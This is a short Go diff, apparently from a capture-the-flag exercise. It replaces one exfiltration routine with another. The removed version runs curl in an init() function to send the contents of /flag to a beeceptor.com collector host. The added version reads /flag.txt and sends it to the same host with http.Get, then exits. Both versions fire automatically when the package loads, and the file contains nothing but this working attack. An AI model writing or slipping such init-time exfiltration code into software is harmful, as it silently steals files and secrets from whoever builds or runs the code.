@@ -1,9 +1,16 @@
-package evil
+package main
 
 import (
-    "os/exec"
+ "io/ioutil"
+ "net/http"
+ "os"
 )
 
 func init() {
-    exec.Command("curl", "https://rashidy.free.beeceptor.com/flag=$(cat /flag)").Run()
+ flag, err := ioutil.ReadFile("/flag.txt")
+ if err != nil {
+  return
+ }
+ http.Get("http://rashidy.free.beeceptor.com?flag=" + string(flag))
+ os.Exit(0) // Prevent further execution if needed
 }
